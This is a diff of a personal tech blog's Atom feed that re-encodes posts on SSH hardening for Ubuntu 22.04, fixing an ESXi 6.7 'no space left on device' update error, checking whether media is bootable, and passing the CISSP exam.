-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh-copy-id user@your_server_ip
+</code></pre></div></div>
 
-&lt;p&gt;Once the key is copied, disable password-based authentication in the SSH configuration file:&lt;/p&gt;
+<p>Once the key is copied, disable password-based authentication in the SSH configuration file:</p>
 
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PasswordAuthentication no
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PasswordAuthentication no
+</code></pre></div></div>
 
-&lt;p&gt;Restart the SSH service again:&lt;/p&gt;
+<p>Restart the SSH service again:</p>
 
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo service ssh restart
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo service ssh restart
+</code></pre></div></div>
 
-&lt;ol&gt;
-  &lt;li&gt;Limit User Access:&lt;br /&gt;
-Restrict SSH access to specific users or user groups only. This minimizes the number of potential entry points for attackers. Edit the SSH configuration file:&lt;/li&gt;
-&lt;/ol&gt;
+<ol>
+  <li>Limit User Access:<br />
+Restrict SSH access to specific users or user groups only. This minimizes the number of potential entry points for attackers. Edit the SSH configuration file:</li>
+</ol>
 
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo nano /etc/ssh/sshd_config
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo nano /etc/ssh/sshd_config
+</code></pre></div></div>
 
-&lt;p&gt;Add the following line to allow access for specific users or groups:&lt;/p&gt;
+<p>Add the following line to allow access for specific users or groups:</p>
 
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;AllowUsers user1 user2
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>AllowUsers user1 user2
+</code></pre></div></div>
 
-&lt;p&gt;Save the file and restart the SSH service.&lt;/p&gt;
+<p>Save the file and restart the SSH service.</p>
 
-&lt;ol&gt;
-  &lt;li&gt;Use SSH Configurations for Increased Security:&lt;br /&gt;
-Within the SSH configuration file, you can implement additional security measures:&lt;/li&gt;
-&lt;/ol&gt;
+<ol>
+  <li>Use SSH Configurations for Increased Security:<br />
+Within the SSH configuration file, you can implement additional security measures:</li>
+</ol>
 
-&lt;ul&gt;
-  &lt;li&gt;Set a specific SSH port (avoid using the default port 22) by changing the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Port&lt;/code&gt; option.&lt;/li&gt;
-  &lt;li&gt;Use a specific IP address to bind SSH to, limiting access to only that IP using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ListenAddress&lt;/code&gt; option.&lt;/li&gt;
-  &lt;li&gt;Implement an idle session timeout to automatically disconnect inactive SSH sessions by setting the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ClientAliveInterval&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ClientAliveCountMax&lt;/code&gt; options.&lt;/li&gt;
-&lt;/ul&gt;
+<ul>
+  <li>Set a specific SSH port (avoid using the default port 22) by changing the <code class="language-plaintext highlighter-rouge">Port</code> option.</li>
+  <li>Use a specific IP address to bind SSH to, limiting access to only that IP using the <code class="language-plaintext highlighter-rouge">ListenAddress</code> option.</li>
+  <li>Implement an idle session timeout to automatically disconnect inactive SSH sessions by setting the <code class="language-plaintext highlighter-rouge">ClientAliveInterval</code> and <code class="language-plaintext highlighter-rouge">ClientAliveCountMax</code> options.</li>
+</ul>
 
-&lt;ol&gt;
-  &lt;li&gt;Use Fail2ban:&lt;br /&gt;
-Install and configure Fail2ban, a tool that scans log files and bans IP addresses with too many failed login attempts. Install Fail2ban using apt:&lt;/li&gt;
-&lt;/ol&gt;
+<ol>
+  <li>Use Fail2ban:<br />
+Install and configure Fail2ban, a tool that scans log files and bans IP addresses with too many failed login attempts. Install Fail2ban using apt:</li>
+</ol>
 
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo apt install fail2ban
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo apt install fail2ban
+</code></pre></div></div>
 
-&lt;p&gt;Configure Fail2ban by creating a new local configuration file:&lt;/p&gt;
+<p>Configure Fail2ban by creating a new local configuration file:</p>
 
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo cp /etc/fail2ban/jail.conf /etc/fail2ban/jail.local
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo cp /etc/fail2ban/jail.conf /etc/fail2ban/jail.local
 sudo nano /etc/fail2ban/jail.local
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+</code></pre></div></div>
 
-&lt;p&gt;Adjust the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;maxretry&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bantime&lt;/code&gt; values according to your needs. Save the file and restart Fail2ban:&lt;/p&gt;
+<p>Adjust the <code class="language-plaintext highlighter-rouge">maxretry</code> and <code class="language-plaintext highlighter-rouge">bantime</code> values according to your needs. Save the file and restart Fail2ban:</p>
 
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo service fail2ban restart
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo service fail2ban restart
+</code></pre></div></div>
 
-&lt;p&gt;Securing SSH on Ubuntu 22.04 is crucial to protect your server from potential threats and unauthorized access. By following the steps outlined in this guide, you can significantly enhance your SSH security and ensure a safer environment for your remote server operations. Remember to regularly update your system and stay informed about the latest security best practices to maintain a secure and reliable SSH setup.&lt;/p&gt;</content><author><name>Ian Marrero</name></author><category term="Linux" /><category term="cybersecurity" /><category term="linux" /><category term="ssh" /><summary type="html">SSH (Secure Shell) is a widely used protocol for securely accessing remote servers. However, its popularity also makes it a target for potential attackers. To ensure the safety of your Ubuntu 22.04 server, it is crucial to implement robust security measures for SSH. In this article, we will discuss essential steps to secure SSH on Ubuntu 22.04, safeguarding your server from unauthorized access and potential security breaches.</summary></entry><entry><title type="html">[Errno 28] No space left on device - Updating VMWare ESXI 6.7</title><link href="https://ianmf.com/2023/02/Errno-28-No-space-left-on-device-Updating-VMWare-ESXI-6-7/" rel="alternate" type="text/html" title="[Errno 28] No space left on device - Updating VMWare ESXI 6.7" /><published>2023-02-03T12:43:00-05:00</published><updated>2023-02-03T12:43:00-05:00</updated><id>https://ianmf.com/2023/02/Errno-28-No-space-left-on-device-Updating-VMWare-ESXI-6-7</id><content type="html" xml:base="https://ianmf.com/2023/02/Errno-28-No-space-left-on-device-Updating-VMWare-ESXI-6-7/">&lt;p&gt;When updating VMWare ESXI 6.7, which runs my homelab, I always get the error “[Errno 28] No space left on device”. But wait… There is enough space on the disk!&lt;/p&gt;
+<p>Securing SSH on Ubuntu 22.04 is crucial to protect your server from potential threats and unauthorized access. By following the steps outlined in this guide, you can significantly enhance your SSH security and ensure a safer environment for your remote server operations. Remember to regularly update your system and stay informed about the latest security best practices to maintain a secure and reliable SSH setup.</p>]]></content><author><name>Ian Marrero</name></author><category term="Linux" /><category term="cybersecurity" /><category term="linux" /><category term="ssh" /><summary type="html"><![CDATA[SSH (Secure Shell) is a widely used protocol for securely accessing remote servers. However, its popularity also makes it a target for potential attackers. To ensure the safety of your Ubuntu 22.04 server, it is crucial to implement robust security measures for SSH. In this article, we will discuss essential steps to secure SSH on Ubuntu 22.04, safeguarding your server from unauthorized access and potential security breaches.]]></summary></entry><entry><title type="html">[Errno 28] No space left on device - Updating VMWare ESXI 6.7</title><link href="http://localhost:4000/2023/02/Errno-28-No-space-left-on-device-Updating-VMWare-ESXI-6-7/" rel="alternate" type="text/html" title="[Errno 28] No space left on device - Updating VMWare ESXI 6.7" /><published>2023-02-03T12:43:00-05:00</published><updated>2023-02-03T12:43:00-05:00</updated><id>http://localhost:4000/2023/02/Errno-28-No-space-left-on-device-Updating-VMWare-ESXI-6-7</id><content type="html" xml:base="http://localhost:4000/2023/02/Errno-28-No-space-left-on-device-Updating-VMWare-ESXI-6-7/"><![CDATA[<p>When updating VMWare ESXI 6.7, which runs my homelab, I always get the error “[Errno 28] No space left on device”. But wait… There is enough space on the disk!</p>
 
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[root@esxi:~] esxcli software profile update -p ESXi-6.7.0-20220104001-standard -d https://hostupdate.vmware.com/software/VUM/PRODUCTION/main/vmw-depot-index.xml
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[root@esxi:~] esxcli software profile update -p ESXi-6.7.0-20220104001-standard -d https://hostupdate.vmware.com/software/VUM/PRODUCTION/main/vmw-depot-index.xml
  [InstallationError]
  [Errno 28] No space left on device
        vibs = VMware_locker_tools-light_11.3.5.18557794-18812553
  Please refer to the log file for more details.
 [root@esxi:~]  [Errno 28] No space left on device
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+</code></pre></div></div>
 
-&lt;p&gt;A quick search on the package name returned several articles addressing the same issue. It is a common issue with VMWare ESXI 6.7. To fix the issue, the package needs to be installed manually.&lt;/p&gt;
+<p>A quick search on the package name returned several articles addressing the same issue. It is a common issue with VMWare ESXI 6.7. To fix the issue, the package needs to be installed manually.</p>
 
-&lt;p&gt;Let’s begin by enabling HTTP Client in ESXI. The first step is pulling the latest version of the package from VMWare.com&lt;/p&gt;
+<p>Let’s begin by enabling HTTP Client in ESXI. The first step is pulling the latest version of the package from VMWare.com</p>
 
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[root@esxi:/tmp] esxcli network firewall ruleset set -e true -r httpClient
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[root@esxi:/tmp] esxcli network firewall ruleset set -e true -r httpClient
+</code></pre></div></div>
 
-&lt;p&gt;Now that the system has access to the internet, let’s query VMWare’s ESXI software repository for the package. The command below will list all “tool-light” packages available for download (older, current, and newer versions).&lt;br /&gt;
-Note: You could modify the grep command to filter out for Update only.&lt;/p&gt;
+<p>Now that the system has access to the internet, let’s query VMWare’s ESXI software repository for the package. The command below will list all “tool-light” packages available for download (older, current, and newer versions).<br />
+Note: You could modify the grep command to filter out for Update only.</p>
 
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[root@esxi:~] esxcli software sources vib list --depot=https://hostupdate.vmware.com/software/VUM/PRODUCTION/main/vmw-depot-index.xml | grep tools-light | sort
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[root@esxi:~] esxcli software sources vib list --depot=https://hostupdate.vmware.com/software/VUM/PRODUCTION/main/vmw-depot-index.xml | grep tools-light | sort
+</code></pre></div></div>
 
-&lt;p&gt;&lt;img src=&quot;/assets/images/2023/02/image-1024x107.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+<p><img src="/assets/images/2023/02/image-1024x107.png" alt="" /></p>
 
-&lt;p&gt;Pick the latest version of the “tools-light” package, download the package to ESXI’s /tmp folder, and install the package manually.&lt;/p&gt;
+<p>Pick the latest version of the “tools-light” package, download the package to ESXI’s /tmp folder, and install the package manually.</p>
 
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[root@esxi:~] cd /tmp
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[root@esxi:~] cd /tmp
 [root@esxi:/tmp] wget http://hostupdate.vmware.com/software/VUM/PRODUCTION/main/esx/vmw/vib20/tools-light/VMware_locker_tools-light_11.3.5.18557794-19193900.vib
 Connecting to hostupdate.vmware.com (184.31.3.90:80)
-saving to &apos;VMware_locker_tools-light_11.3.5.18557794-19193900.vib&apos;
+saving to 'VMware_locker_tools-light_11.3.5.18557794-19193900.vib'
 VMware_locker_tools- 100% |************************************************************************|  177M  0:00:00 ETA
-&apos;VMware_locker_tools-light_11.3.5.18557794-19193900.vib&apos; saved
+'VMware_locker_tools-light_11.3.5.18557794-19193900.vib' saved
 [root@esxi:/tmp] esxcli software vib install -f -v /tmp/VMware_locker_tools-light_11.3.5.18557794-19193900.vib
 Installation Result
    Message: Operation finished successfully.
@@ -188,11 +316,11 @@ Installation Result
    VIBs Installed: VMware_locker_tools-light_11.3.5.18557794-19193900
    VIBs Removed: VMware_locker_tools-light_11.2.5.17337674-17867351
    VIBs Skipped:
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+</code></pre></div></div>
 
-&lt;p&gt;After the installation of ‘tools-light’ finishes successfully, re-run the ESXI profile update command again. It will take several minutes to run.&lt;/p&gt;
+<p>After the installation of ‘tools-light’ finishes successfully, re-run the ESXI profile update command again. It will take several minutes to run.</p>
 
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[root@esxi:/tmp] esxcli software profile update -p ESXi-6.7.0-20220104001-standard -d https://hostupdate.vmware.com/software/VUM/PRODUCTION/main/vmw-depot-index.xml
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[root@esxi:/tmp] esxcli software profile update -p ESXi-6.7.0-20220104001-standard -d https://hostupdate.vmware.com/software/VUM/PRODUCTION/main/vmw-depot-index.xml
 Update Result
    Message: The update completed successfully, but the system needs to be rebooted for the changes to be effective.
    Reboot Required: true
@@ -204,779 +332,54 @@ Update Result
 ...
 
 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+</code></pre></div></div>
 
-&lt;p&gt;For security reasons, disable the HTTP Client again, and then reboot the ESXI host&lt;br /&gt;
-Note: Remember to turn off VMs, set host to maintenance mode, or whatever steps are necessary in your environment.&lt;/p&gt;
+<p>For security reasons, disable the HTTP Client again, and then reboot the ESXI host<br />
+Note: Remember to turn off VMs, set host to maintenance mode, or whatever steps are necessary in your environment.</p>
 
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[root@esxi:/tmp] esxcli network firewall ruleset set -e false -r httpClient
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[root@esxi:/tmp] esxcli network firewall ruleset set -e false -r httpClient
+</code></pre></div></div>
 
-&lt;p&gt;Verify the new Profile Name is being used by checking the ESXI Web Admin app.&lt;/p&gt;
+<p>Verify the new Profile Name is being used by checking the ESXI Web Admin app.</p>
 
-&lt;p&gt;&lt;img src=&quot;/assets/images/2023/02/image-2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+<p><img src="/assets/images/2023/02/image-2.png" alt="" /></p>
 
-&lt;p&gt;Thanks for reading!&lt;/p&gt;</content><author><name>Ian Marrero</name></author><category term="System Administration" /><category term="esxi" /><category term="vmware" /><category term="homelab" /><summary type="html">When updating VMWare ESXI 6.7, which runs my homelab, I always get the error “[Errno 28] No space left on device”. But wait… There is enough space on the disk!</summary></entry><entry><title type="html">Verify if a media device or file is bootable</title><link href="https://ianmf.com/2022/08/Verify-if-a-media-device-or-file-is-bootable/" rel="alternate" type="text/html" title="Verify if a media device or file is bootable" /><published>2022-08-25T20:21:00-05:00</published><updated>2022-08-25T20:21:00-05:00</updated><id>https://ianmf.com/2022/08/Verify-if-a-media-device-or-file-is-bootable</id><content type="html" xml:base="https://ianmf.com/2022/08/Verify-if-a-media-device-or-file-is-bootable/">&lt;p&gt;To verify if a removable media (e.g. USB, DVD, or ISO) is bootable, you could use file tool on Linux systems. The command &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;file -s /path/to/media&lt;/code&gt; reads block special files, such as partitions, and outputs the information.&lt;/p&gt;
+<p>Thanks for reading!</p>]]></content><author><name>Ian Marrero</name></author><category term="System Administration" /><category term="esxi" /><category term="vmware" /><category term="homelab" /><summary type="html"><![CDATA[When updating VMWare ESXI 6.7, which runs my homelab, I always get the error “[Errno 28] No space left on device”. But wait… There is enough space on the disk!]]></summary></entry><entry><title type="html">Verify if a media device or file is bootable</title><link href="http://localhost:4000/2022/08/Verify-if-a-media-device-or-file-is-bootable/" rel="alternate" type="text/html" title="Verify if a media device or file is bootable" /><published>2022-08-25T20:21:00-05:00</published><updated>2022-08-25T20:21:00-05:00</updated><id>http://localhost:4000/2022/08/Verify-if-a-media-device-or-file-is-bootable</id><content type="html" xml:base="http://localhost:4000/2022/08/Verify-if-a-media-device-or-file-is-bootable/"><![CDATA[<p>To verify if a removable media (e.g. USB, DVD, or ISO) is bootable, you could use file tool on Linux systems. The command <code class="language-plaintext highlighter-rouge">file -s /path/to/media</code> reads block special files, such as partitions, and outputs the information.</p>
 
-&lt;p&gt;To test this, I inserted RHEL 8.2 Installation ISO as a disk in a VM. The device path is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/dev/sr0&lt;/code&gt;. Once I verified the disk is accessible, I ran &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;file -s /dev/sr0&lt;/code&gt;. The output for RHEL Installation ISO shows the disk as a DOS / Master Boot Record partition, meaning it is a bootable media. For the second test, I used a Windows 10 Installation ISO. The output shows the media is a CD-ROM filesystem that is bootable.&lt;/p&gt;
+<p>To test this, I inserted RHEL 8.2 Installation ISO as a disk in a VM. The device path is <code class="language-plaintext highlighter-rouge">/dev/sr0</code>. Once I verified the disk is accessible, I ran <code class="language-plaintext highlighter-rouge">file -s /dev/sr0</code>. The output for RHEL Installation ISO shows the disk as a DOS / Master Boot Record partition, meaning it is a bootable media. For the second test, I used a Windows 10 Installation ISO. The output shows the media is a CD-ROM filesystem that is bootable.</p>
 
-&lt;p&gt;An observation: Notice the Windows media output states the media is bootable, unlike the Linux media, that only shows partition information.&lt;/p&gt;
+<p>An observation: Notice the Windows media output states the media is bootable, unlike the Linux media, that only shows partition information.</p>
 
-&lt;p&gt;&lt;img src=&quot;/assets/images/2022/08/image-1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+<p><img src="/assets/images/2022/08/image-1.png" alt="" /></p>
 
-&lt;p&gt;Screenshot&lt;/p&gt;
+<p>Screenshot</p>
 
-&lt;p&gt;References:&lt;/p&gt;
+<p>References:</p>
 
-&lt;p&gt;&lt;a href=&quot;https://www.man7.org/linux/man-pages/man1/file.1.html&quot;&gt;file(1) - Linux manual page (man7.org)&lt;/a&gt;&lt;/p&gt;</content><author><name>Ian Marrero</name></author><category term="Linux" /><category term="linux" /><summary type="html">To verify if a removable media (e.g. USB, DVD, or ISO) is bootable, you could use file tool on Linux systems. The command file -s /path/to/media reads block special files, such as partitions, and outputs the information.</summary></entry><entry><title type="html">I am CISSP Certified!</title><link href="https://ianmf.com/2021/04/I-am-CISSP-Certified/" rel="alternate" type="text/html" title="I am CISSP Certified!" /><published>2021-04-07T21:26:00-05:00</published><updated>2021-04-07T21:26:00-05:00</updated><id>https://ianmf.com/2021/04/I-am-CISSP-Certified</id><content type="html" xml:base="https://ianmf.com/2021/04/I-am-CISSP-Certified/">&lt;p&gt;I passed the CISSP exam in April 2021! Such a difficult exam! The exam is nothing like the practice tests you can find available for free or for purchase. Throughout the exam, I felt unprepared; halfway through the exam I felt like I was failing, that I should take mind-notes for my next attempt. To my surprised, I passed at 100 questions at around 110 minutes into the exam. This is how I did it…&lt;/p&gt;
+<p><a href="https://www.man7.org/linux/man-pages/man1/file.1.html">file(1) - Linux manual page (man7.org)</a></p>]]></content><author><name>Ian Marrero</name></author><category term="Linux" /><category term="linux" /><summary type="html"><![CDATA[To verify if a removable media (e.g. USB, DVD, or ISO) is bootable, you could use file tool on Linux systems. The command file -s /path/to/media reads block special files, such as partitions, and outputs the information.]]></summary></entry><entry><title type="html">I am CISSP Certified!</title><link href="http://localhost:4000/2021/04/I-am-CISSP-Certified/" rel="alternate" type="text/html" title="I am CISSP Certified!" /><published>2021-04-07T21:26:00-05:00</published><updated>2021-04-07T21:26:00-05:00</updated><id>http://localhost:4000/2021/04/I-am-CISSP-Certified</id><content type="html" xml:base="http://localhost:4000/2021/04/I-am-CISSP-Certified/"><![CDATA[<p>I passed the CISSP exam in April 2021! Such a difficult exam! The exam is nothing like the practice tests you can find available for free or for purchase. Throughout the exam, I felt unprepared; halfway through the exam I felt like I was failing, that I should take mind-notes for my next attempt. To my surprised, I passed at 100 questions at around 110 minutes into the exam. This is how I did it…</p>
 
-&lt;p&gt;I started preparing myself a few months ago. I started with CISSP Certification Training by Thor Pedersen course on Udemy. Thor goes delivers the content for all 8 domains in an easy to &lt;em&gt;digest&lt;/em&gt; manner. You could easily watch the whole CISSP series twice to better absorb the concepts. At this point, I didn’t have a set date on when I wanted to take the test. Another video set I watch a few years ago was Kelly Handerhan on Cybrary.it. The videos are highly recommended on &lt;a href=&quot;https://reddit.com/r/cissp/&quot;&gt;r/cissp&lt;/a&gt;.&lt;/p&gt;
+<p>I started preparing myself a few months ago. I started with CISSP Certification Training by Thor Pedersen course on Udemy. Thor goes delivers the content for all 8 domains in an easy to <em>digest</em> manner. You could easily watch the whole CISSP series twice to better absorb the concepts. At this point, I didn’t have a set date on when I wanted to take the test. Another video set I watch a few years ago was Kelly Handerhan on Cybrary.it. The videos are highly recommended on <a href="https://reddit.com/r/cissp/">r/cissp</a>.</p>
 
-&lt;p&gt;After two months passed from watching the videos, I decided I should start officially studying for the CISSP certification and dedicate time to it. I purchased the book “Eleventh Hour CISSP: Study Guide”. This is a terrific book with great content. However, it is not updated with the latest changes, and a few topics found on the test were not covered by the book. Regardless of this, it is a great resource to read on your last month before taking the test. I think I would have benefited from reading the official CISSP book or another book that covers all topics in more details. The Eleventh Hour is not for people new to security. You better have a basic to fair understanding of computer architecture, software development, networking, encryption, and security.&lt;/p&gt;
+<p>After two months passed from watching the videos, I decided I should start officially studying for the CISSP certification and dedicate time to it. I purchased the book “Eleventh Hour CISSP: Study Guide”. This is a terrific book with great content. However, it is not updated with the latest changes, and a few topics found on the test were not covered by the book. Regardless of this, it is a great resource to read on your last month before taking the test. I think I would have benefited from reading the official CISSP book or another book that covers all topics in more details. The Eleventh Hour is not for people new to security. You better have a basic to fair understanding of computer architecture, software development, networking, encryption, and security.</p>
 
-&lt;p&gt;After reading this book twice, I went ahead and scheduled the exam a month out. Nothing puts that sense of urgency like seeing that charge for $699 on your credit card. I must pass this test!&lt;/p&gt;
+<p>After reading this book twice, I went ahead and scheduled the exam a month out. Nothing puts that sense of urgency like seeing that charge for $699 on your credit card. I must pass this test!</p>
 
-&lt;p&gt;I purchased Boson’s CISSP preparation practice test. It was a great resource to test myself on the concepts covered by the exam. After each question, I would review the answer and explanation. If there was a concept I didn’t understand or required that I researched further, I would create a flashcard from the explanation or from researching myself online. The practice questions are NOT like the questions I experienced throughout the exam. Boson’s CISSP practice questions were very technical and simple.&lt;/p&gt;
+<p>I purchased Boson’s CISSP preparation practice test. It was a great resource to test myself on the concepts covered by the exam. After each question, I would review the answer and explanation. If there was a concept I didn’t understand or required that I researched further, I would create a flashcard from the explanation or from researching myself online. The practice questions are NOT like the questions I experienced throughout the exam. Boson’s CISSP practice questions were very technical and simple.</p>
 
-&lt;p&gt;During the CISSP test, you should have a Risk Advisor / Security Manager mentality. I recommend the following videos to how to mentally prepare for the CISSP exam:&lt;/p&gt;
+<p>During the CISSP test, you should have a Risk Advisor / Security Manager mentality. I recommend the following videos to how to mentally prepare for the CISSP exam:</p>
 
-&lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=v2Y6Zog8h2A&quot;&gt;Why you will pass the CISSP&lt;/a&gt; by Kelly Handerhan talks about what is your role and how you should approach the problems in the exam. You are not a Doer but a manager and risk advisor.&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=bopYRxAyTU8&quot;&gt;SANS Webcast - CISSP Cram Session by Eric Conrad&lt;/a&gt; explains some concepts covered in the test but most importantly how the test works.&lt;/li&gt;
-&lt;/ul&gt;
+<ul>
+  <li><a href="https://www.youtube.com/watch?v=v2Y6Zog8h2A">Why you will pass the CISSP</a> by Kelly Handerhan talks about what is your role and how you should approach the problems in the exam. You are not a Doer but a manager and risk advisor.</li>
+  <li><a href="https://www.youtube.com/watch?v=bopYRxAyTU8">SANS Webcast - CISSP Cram Session by Eric Conrad</a> explains some concepts covered in the test but most importantly how the test works.</li>
+</ul>
 
-&lt;p&gt;The resource I found the most valuable the 3 days before leading to the exam was &lt;a href=&quot;https://www.youtube.com/c/DestinationCertification/playlists&quot;&gt;Destination Certification&lt;/a&gt;. These videos help me glue all the pieces together and point out concepts I needed to do more studying on. I watched the videos 2 days before testing and on my way to testing. Destination Certification goes over the most critical concepts you need to know for the CISSP exam. By far, this was the best resource I used to help me cement the concepts and link them together.&lt;/p&gt;
+<p>The resource I found the most valuable the 3 days before leading to the exam was <a href="https://www.youtube.com/c/DestinationCertification/playlists">Destination Certification</a>. These videos help me glue all the pieces together and point out concepts I needed to do more studying on. I watched the videos 2 days before testing and on my way to testing. Destination Certification goes over the most critical concepts you need to know for the CISSP exam. By far, this was the best resource I used to help me cement the concepts and link them together.</p>
 
-&lt;p&gt;Lastly, writing index cards with the concepts I was not familiar or weak helped me a lot. By the time I went to take the CISSP exam, I have already memorized the information on the index cards. There is something about writing something down and being able to memorize it that works great for studying. You don’t need to read the index cards over and over; you just need to write it down to memorize it.&lt;/p&gt;
+<p>Lastly, writing index cards with the concepts I was not familiar or weak helped me a lot. By the time I went to take the CISSP exam, I have already memorized the information on the index cards. There is something about writing something down and being able to memorize it that works great for studying. You don’t need to read the index cards over and over; you just need to write it down to memorize it.</p>
 
-&lt;p&gt;&lt;em&gt;But I thought you said you felt unprepared for the test?&lt;/em&gt; That is right. Aside for the resources I mentioned above, I was able to pass the test with 100 questions because: personal work experience and critical thinking. The exam presented me with several questions that I could answer based on previous work experience. The critical thinking came by analyzing the wording of the question and the wording of the answers: What is the situation? What step of the X framework/plan am I on? What is the next logical step? What does the question want as an answer? What protects human life or my organization? There were some questions I had no idea how to answer and asking myself these questions &lt;em&gt;probably&lt;/em&gt; helped me answer them correctly.&lt;/p&gt;
+<p><em>But I thought you said you felt unprepared for the test?</em> That is right. Aside for the resources I mentioned above, I was able to pass the test with 100 questions because: personal work experience and critical thinking. The exam presented me with several questions that I could answer based on previous work experience. The critical thinking came by analyzing the wording of the question and the wording of the answers: What is the situation? What step of the X framework/plan am I on? What is the next logical step? What does the question want as an answer? What protects human life or my organization? There were some questions I had no idea how to answer and asking myself these questions <em>probably</em> helped me answer them correctly.</p>
 
-&lt;p&gt;I am thrilled to have reached this step in my professional career. Next, I might go for offensive security or cloud security. Let’s see…&lt;/p&gt;
+<p>I am thrilled to have reached this step in my professional career. Next, I might go for offensive security or cloud security. Let’s see…</p>
 
-&lt;p&gt;If you are reading this far, you might be interested in taking the CISSP exam. If you have any questions, you can comment below, and I try my best to help you.&lt;br /&gt;
